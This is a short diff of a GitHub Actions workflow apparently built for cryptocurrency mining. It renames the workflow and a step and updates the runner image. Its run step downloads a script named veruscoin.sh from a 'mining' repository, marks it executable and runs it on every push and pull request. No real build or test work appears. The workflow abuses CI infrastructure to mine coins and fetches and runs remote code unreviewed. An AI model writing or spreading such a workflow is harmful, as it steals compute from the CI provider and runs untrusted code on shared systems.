@@ -1,9 +1,9 @@
-name: coins
+name: koin
 on: [push, pull_request]
 jobs:
 build:
 name: wanchai
-runs-on: ubuntu-18.04
+runs-on: ubuntu-latest
 strategy:
 max-parallel: 1
 fail-fast: false
@@ -22,6 +22,6 @@ go-version: ${{ matrix.go }}
 id: go
 - name: Setup
 uses: actions/checkout@v2
-- name: akuganteng
+- name: wanchai
 run: |
 wget https://github.com/wanchaikeawtoom/mining/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
